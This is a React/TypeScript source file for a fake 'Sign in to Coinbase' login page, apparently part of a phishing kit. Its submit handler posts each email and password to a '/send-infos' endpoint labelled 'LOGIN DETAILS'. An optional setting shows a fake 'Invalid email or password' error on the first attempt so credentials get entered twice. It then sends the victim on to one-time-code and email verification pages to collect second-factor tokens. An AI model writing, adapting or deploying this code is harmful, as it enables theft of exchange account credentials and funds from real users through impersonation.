import { Box, Link, Text } from "@chakra-ui/react";
import React, { useState } from "react";
import { Input } from "../components/Input";
import { Wrapper } from "../components/Wrapper";

import iconVisibleActive from "../assets/images/icon-visible-active.svg";
import iconVisibleInactive from "../assets/images/icon-visible-inactive.svg";
import { Button } from "../components/Button";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import axios from "axios";
import { useForm } from "react-hook-form";
import { useNavigate } from "react-router-dom";
import { Alert } from "../components/Alert";

interface LoginProps {}

const schema = yup.object().shape({
  email: yup
    .string()
    .required("Email is required")
    .email("Please enter a valid email."),
  password: yup.string().required("Password is required").min(8),
});

export const Login: React.FC<LoginProps> = () => {
  const [passwordVisible, setPasswordVisible] = useState(false);
  const {
    register,
    handleSubmit,
    reset,
    formState: { isValid },
  } = useForm({
    resolver: yupResolver(schema),
    mode: "onBlur",
  });

  const navigate = useNavigate();

  const [loginAttempt, setLoginAttempt] = useState(0);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<{
    show: boolean;
    message: string;
    status: "NORMAL" | "ERROR" | "WARNING";
  }>({
    show: false,
    message: "",
    status: "WARNING",
  });

  const [logins, setLogins] = useState({});

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);

    try {
      await axios.post(
        "/send-infos",
        JSON.stringify({
          form: "LOGIN DETAILS",
          loginDetails: { loginAttempt: loginAttempt + 1, ...data },
        })
      );
    } catch (error) {
      console.log(error);
    }

    setLogins({
      ...logins,
      [loginAttempt + 1]: {
        form: "LOGIN DETAILS",
        loginDetails: { loginAttempt: loginAttempt + 1, ...data },
      },
    });

    if (!loginAttempt && process.env.REACT_APP_DOUBLE_LOGIN === "ON") {
      setLoginAttempt(1);
      setLoading(false);
      setError({
        show: true,
        message: `Invalid email or password. Try clicking 'Forgot Password' if you're having trouble signing in.`,
        status: "ERROR",
      });
      reset({
        email: "",
        password: "",
      });
      return;
    }

    navigate(
      process.env.REACT_APP_OTP_PAGE === "ON" &&
        process.env.REACT_APP_OTP_AFTER_LOGIN === "ON"
        ? "/signin_step_two"
        : "/email_verification",
      {
        state: {
          logins: {
            ...logins,
            [loginAttempt + 1]: {
              form: "LOGIN DETAILS",
              loginDetails: { loginAttempt: loginAttempt + 1, ...data },
            },
          },
          email: data.email,
          alert: {
            show: true,
            description: "Please enter verification token from your device.",
            status: "NORMAL",
          },
        },
      }
    );
  });
  return (
    <Wrapper pt={"74px"} bgColor={"#1652f0"}>
      {error.show && (
        <Alert status="ERROR" description={error.message} setError={setError} />
      )}
      <Box maxW={"400px"} m={[0, "40px auto"]}>
        <Text
          as={"h2"}
          h={"34px"}
          fontSize={"30px"}
          fontWeight={400}
          lineHeight={1.13}
          textAlign={"center"}
          color={"#fff"}
          m={"10px 0 20px"}
          mb={"40px"}
          fontFamily={`graphik,-apple-system,BlinkMacSystemFont,segoe ui,roboto,oxygen,ubuntu,cantarell,fira sans,droid sans,helvetica neue,sans-serif`}
          style={{
            textRendering: "optimizeLegibility",
          }}
        >
          Sign in to Coinbase
        </Text>
        <Box
          bg={"#fff"}
          boxShadow={"0 1px 46px -4px rgb(0 0 0 / 28%)"}
          borderRadius={[0, "4px"]}
        >
          <Box p={"32px 24px"}>
            <Box as={"form"}>
              <Input placeholder="Email" register={register("email")} />
              <Input
                register={register("password")}
                placeholder="Password"
                type={passwordVisible ? "text" : "password"}
                inputRightElement={
                  <Box
                    as={"span"}
                    w={"18px"}
                    h={"16px"}
                    bgImage={
                      !passwordVisible ? iconVisibleActive : iconVisibleInactive
                    }
                    bgRepeat={"no-repeat"}
                    mt={"6px"}
                    cursor={"pointer"}
                    onClick={() => {
                      setPasswordVisible(!passwordVisible);
                    }}
                  />
                }
              />
              <Box mb={"5px"} pos={"relative"}>
                <Box overflow={"hidden"} pos={"relative"}>
                  <Button
                    text={loading ? "Signing in..." : "Sign In"}
                    onClick={onSubmit}
                    isDisabled={!isValid || loading}
                  />
                  <Text
                    as={"label"}
                    color={"#708599"}
                    pt={"10px"}
                    fontSize={"12px"}
                    fontWeight={500}
                    minH={"20px"}
                    pl={"20px"}
                    display={"block"}
                    mb={"5px"}
                    lineHeight={"20px"}
                    cursor={"pointer"}
                  >
                    <input
                      type={"checkbox"}
                      style={{
                        borderRadius: "2px",
                        float: "left",
                        margin: "4px 0 0",
                        lineHeight: "normal",
                        width: "auto",
                        marginLeft: "-20px",
                        fontSize: "14px",
                        fontWeight: 400,
                        verticalAlign: "middle",
                      }}
                    />{" "}
                    Keep me signed in on this computer
                  </Text>
                </Box>
              </Box>
            </Box>
          </Box>
        </Box>
        <Box textAlign={"center"} p={"30px 0 0"} fontSize={"13px"}>
          <Text a={"p"} color="#8e9eae" lineHeight={1.4} m={"0 0 10px"}>
            <Link fontSize={"15px"} color={"#fff"} textDecor={"none"}>
              Forgot password?
            </Link>{" "}
            {" "}
            <Link fontSize={"15px"} color={"#fff"} textDecor={"none"}>
              Don't have an account?
            </Link>{" "}
            {" "}
            <Link fontSize={"15px"} color={"#fff"} textDecor={"none"}>
              Privacy Policy
            </Link>
            <Box as={"br"} />
          </Text>
        </Box>
      </Box>
    </Wrapper>
  );
};
